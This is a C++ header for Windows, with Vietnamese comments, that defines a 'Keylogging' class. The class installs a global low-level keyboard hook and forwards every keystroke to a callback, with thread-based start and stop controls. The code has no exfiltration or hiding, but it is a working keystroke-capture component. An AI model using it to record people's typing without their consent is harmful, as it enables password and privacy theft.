#pragma once

#include <iostream>
#include <fstream>
#include <functional>
#include <atomic>
#include <thread>

#include <windows.h>
#include <winuser.h>

#pragma comment(lib, "user32.lib")

// Callback nhận mã phím
using KeyEventCallback = std::function<void(int)>;

class Keylogging {
private:
    inline static KeyEventCallback callback = nullptr;
    inline static std::atomic<bool> running = false;
    inline static HHOOK keyboardHook = nullptr;
    inline static std::thread worker;
    inline static DWORD threadId = 0;

    // Hàm Hook của Windows 
    static LRESULT CALLBACK HookProc(int nCode, WPARAM wParam, LPARAM lParam) {
        if (nCode == HC_ACTION && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {
            KBDLLHOOKSTRUCT* pKey = reinterpret_cast<KBDLLHOOKSTRUCT*>(lParam);
            if (callback) {
                callback(pKey->vkCode);
            }
        }
        return CallNextHookEx(keyboardHook, nCode, wParam, lParam);
    }

    // Vòng lặp tin nhắn (Message Loop) cho luồng Hook
    static void Loop() {
        // Lưu Thread ID để gửi lệnh dừng sau này
        threadId = GetCurrentThreadId();
        
        HINSTANCE hInst = GetModuleHandle(nullptr);
        keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, HookProc, hInst, 0);

        if (!keyboardHook) {
            running.store(false);
            return;
        }

        // Message Pump 
        MSG msg;
        while (GetMessage(&msg, nullptr, 0, 0)) {
            if (msg.message == WM_QUIT) break;
            TranslateMessage(&msg);
            DispatchMessage(&msg);
        }

        UnhookWindowsHookEx(keyboardHook);
        keyboardHook = nullptr;
        threadId = 0;
    }

public:
    // Đăng ký hàm xử lý khi có phím nhấn
    static void setCallback(KeyEventCallback cb) {
        callback = cb;
    }

    // Bắt đầu Keylogger
    static void start() {
        if (running.load()) return;
        running.store(true);
        worker = std::thread(Loop);
    }

    // Dừng Keylogger
    static void stop() {
        if (!running.load()) return;
        running.store(false);

        // Gửi tin nhắn WM_QUIT vào luồng đang chạy để phá vỡ vòng lặp GetMessage
        if (threadId != 0) {
            PostThreadMessage(threadId, WM_QUIT, 0, 0);
        }

        if (worker.joinable()) {
            worker.join();
        }
    }

    // Kiểm tra trạng thái
    static bool isRunning() {
        return running.load();
    }
};